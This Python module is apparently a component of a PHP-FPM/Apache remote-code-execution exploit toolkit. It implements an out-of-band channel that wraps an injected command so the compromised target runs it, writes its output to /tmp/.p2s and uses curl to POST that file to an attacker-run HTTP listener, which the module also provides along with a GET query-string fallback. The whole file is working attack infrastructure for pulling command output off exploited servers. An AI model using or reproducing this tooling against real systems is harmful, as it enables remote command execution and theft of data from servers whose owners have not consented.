#!/usr/bin/env python3
# INDEX: out-of-band command-output side channel | fpm apache | needs target outbound egress
"""Out-of-band command-output side channel.

Retrieves command output from the target over a normal outbound callback
instead of the exploit's own response (which may crash/close the worker before
a body is framed) or a shared-volume proof file (lab-only). Ported from
ravhirizaldi/php2shell-engine-rce (official-lab/pure_shell.py: validate_oob +
the run_chain wrapper), with a pure-stdlib listener so retrieval needs no second
container:

    lst = OOBListener()                       # binds 0.0.0.0:<ephemeral>
    full = wrap_command("id; uname -a", lst.url_for("HOST"))  # inject full as cmd
    ...run the exploit with `full` as the command...
    body = lst.wait(timeout=10)               # the target POSTed its output here

wrap_command produces::

    (CMD) > /tmp/.p2s 2>&1; curl -s --data-binary @/tmp/.p2s URL

so the target runs the command, captures stdout+stderr to a temp file, and POSTs
the WHOLE file to the collector in one request. Because retrieval is a normal
outbound POST it carries arbitrary-size output (not limited by the exploit's
response framing) and traverses egress like a web shell's callback.

validate_oob() refuses any URL containing a shell metacharacter, because the URL
is interpolated verbatim into the command string sent to the target.

stdlib only (http.server, socket, threading, urllib).
"""
from __future__ import annotations

import threading
import urllib.parse
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

_SHELL_BAD = set(" \t\r\n\"'`$;&|<>#\\(){}")


def validate_oob(url):
    """Accept only a plain http(s) callback URL that is safe to interpolate into
    a shell command. Raises ValueError otherwise; returns the url unchanged."""
    p = urllib.parse.urlparse(url)
    if p.scheme not in ("http", "https") or not p.netloc:
        raise ValueError("oob URL must be http(s)://host[:port]/path")
    if any(ch in _SHELL_BAD for ch in url):
        raise ValueError("oob URL contains a shell-unsafe character")
    return url


def wrap_command(cmd, url, tmp="/tmp/.p2s", curl_opts="-s"):
    """Wrap `cmd` so the target captures its combined output and POSTs it to
    `url`. The whole thing is one shell command string (no newlines)."""
    validate_oob(url)
    return "(%s) > %s 2>&1; curl %s --data-binary @%s %s" % (
        cmd, tmp, curl_opts, tmp, url)


class _Handler(BaseHTTPRequestHandler):
    def _capture(self):
        length = int(self.headers.get("Content-Length") or 0)
        body = self.rfile.read(length) if length else b""
        src = self.client_address[0] if self.client_address else "-"
        self.server.record(src, self.command, self.path, body)
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.send_header("Content-Length", "3")
        self.end_headers()
        self.wfile.write(b"OK\n")

    do_POST = _capture
    do_PUT = _capture

    def do_GET(self):
        # Query-string fallback channel: GET /?d=<payload>.
        q = urllib.parse.urlparse(self.path).query
        d = urllib.parse.parse_qs(q).get("d", [""])[0]
        src = self.client_address[0] if self.client_address else "-"
        self.server.record(src, "GET", self.path, d.encode("latin1", "replace"))
        self.send_response(200)
        self.send_header("Content-Length", "3")
        self.end_headers()
        self.wfile.write(b"OK\n")

    def log_message(self, *a):
        pass


class OOBListener:
    """Threaded stdlib collector for --oob callbacks.

    Captures each inbound POST/PUT body (and a GET ?d= fallback) and signals
    waiters. `host` defaults to 0.0.0.0 so a container target can reach the host;
    pass host="127.0.0.1" for a loopback-only collector."""

    def __init__(self, host="0.0.0.0", port=0):
        self._server = ThreadingHTTPServer((host, port), _Handler)
        self._server.record = self._record       # type: ignore[attr-defined]
        self.host, self.port = self._server.server_address
        self.captures = []                        # list of dicts
        self._lock = threading.Lock()
        self._event = threading.Event()
        self._thread = threading.Thread(target=self._server.serve_forever,
                                        daemon=True)
        self._thread.start()

    def _record(self, src, method, path, body):
        with self._lock:
            self.captures.append({"src": src, "method": method,
                                  "path": path, "body": body})
        self._event.set()

    def url_for(self, host, path="/"):
        """Build the callback URL the target should hit. `host` is how the
        target reaches this collector (its Docker-bridge IP, or a public host)."""
        return "http://%s:%d%s" % (host, self.port, path)

    def wait(self, timeout=10.0, index=0):
        """Block until capture #index exists; return its body or None."""
        deadline = threading.TIMEOUT_MAX if timeout is None else timeout
        end = None
        import time
        start = time.time()
        while True:
            with self._lock:
                if len(self.captures) > index:
                    return self.captures[index]["body"]
            remaining = deadline - (time.time() - start)
            if remaining <= 0:
                return None
            self._event.wait(timeout=min(0.25, remaining))
            self._event.clear()

    def close(self):
        try:
            self._server.shutdown()
        except Exception:
            pass
        try:
            self._server.server_close()
        except Exception:
            pass

    def __enter__(self):
        return self

    def __exit__(self, *exc):
        self.close()


def main():
    import argparse
    ap = argparse.ArgumentParser(description="OOB command-output collector")
    ap.add_argument("--host", default="0.0.0.0")
    ap.add_argument("--port", type=int, default=0)
    ap.add_argument("--count", type=int, default=1,
                    help="exit after N captures (0 = run forever)")
    args = ap.parse_args()
    lst = OOBListener(host=args.host, port=args.port)
    print("oob listener on %s:%d" % (lst.host, lst.port), flush=True)
    print("callback url (replace HOST): %s" % lst.url_for("HOST"), flush=True)
    try:
        n = 0
        while args.count == 0 or n < args.count:
            body = lst.wait(timeout=None, index=n)
            cap = lst.captures[n]
            print("--- %s %s %s (%d bytes) ---"
                  % (cap["src"], cap["method"], cap["path"], len(body)),
                  flush=True)
            print(body.decode("utf-8", "replace"), flush=True)
            n += 1
    except KeyboardInterrupt:
        pass
    finally:
        lst.close()


if __name__ == "__main__":
    main()
